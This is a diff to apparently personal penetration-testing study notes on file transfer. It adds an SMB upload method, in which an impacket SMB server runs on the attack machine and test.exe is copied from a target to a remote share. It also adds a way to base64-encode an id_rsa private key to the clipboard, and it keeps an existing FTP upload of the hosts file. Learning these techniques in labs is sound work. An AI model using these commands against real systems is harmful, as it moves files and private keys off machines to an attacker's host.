@@ -222,6 +222,23 @@ ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
 
+### <mark class="hltr-orange">SMB Upload</mark>
+
+We launch an smb server on the attack machine:
+
+```shell-session
+sudo impacket-smbserver -smb2support CompData /home/dali/Documents/
+```
+
+- CompData is the share name
+- /home/dali/Documents is the directory where the files will be stored
+
+
+then we upload the files:
+```
+copy test.exe \\10.10.14.32\CompData
+```
+
 ---
 # <mark class="hltr-pink">Linux File Transfer Methods</mark>
 
@@ -230,6 +247,11 @@ ftp> bye
 - encoding
 ```shell-session
 cat id_rsa |base64 -w 0;echo
+```
+
+(Directly copying to the clipboard)
+```
+cat id_rsa |base64 -w 0 | xsel -i --clipboard
 ```
 
 - decoding
